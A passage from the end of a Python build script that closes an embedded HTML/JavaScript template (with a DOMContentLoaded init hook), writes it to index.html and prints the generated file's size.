if (document.readyState === "loading") {{
  document.addEventListener("DOMContentLoaded", init);
}} else {{
  init();
}}
</script>
</body>
</html>
"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    size_kb = os.path.getsize("index.html") / 1024
    print(f"Successfully generated index.html ({size_kb:.1f} KB)")

if __name__ == "__main__":
    build()
